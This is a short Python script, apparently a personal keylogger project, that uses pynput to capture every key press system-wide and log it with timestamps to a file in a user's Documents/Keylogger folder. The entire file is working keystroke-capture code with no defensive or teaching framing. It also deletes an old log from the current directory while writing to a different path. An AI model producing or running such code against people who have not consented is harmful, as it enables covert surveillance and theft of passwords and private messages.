from pynput.keyboard import Key, Listener
import logging
import os

if os.path.exists("keyLog.txt"):
  os.remove("keyLog.txt")

log_directory = r"/Users/darren/Documents/Keylogger/"
logging.basicConfig(filename = (log_directory + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
   logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()